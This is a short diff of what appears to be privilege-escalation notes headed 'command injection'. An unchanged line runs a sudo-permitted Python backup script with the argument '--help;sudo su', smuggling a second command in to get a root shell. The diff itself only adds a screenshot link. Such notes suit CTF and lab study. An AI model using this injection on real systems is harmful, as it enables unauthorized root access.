@@ -14,3 +14,6 @@ command injection
 
 --help to statisfy tar 
 sudo /usr/bin/python3 /home/user/safe_backup.py -e "--help;sudo su"
+
+
+![image](https://user-images.githubusercontent.com/59768512/167270335-1135306a-4cfc-4311-a00e-7111c12aeda2.png)
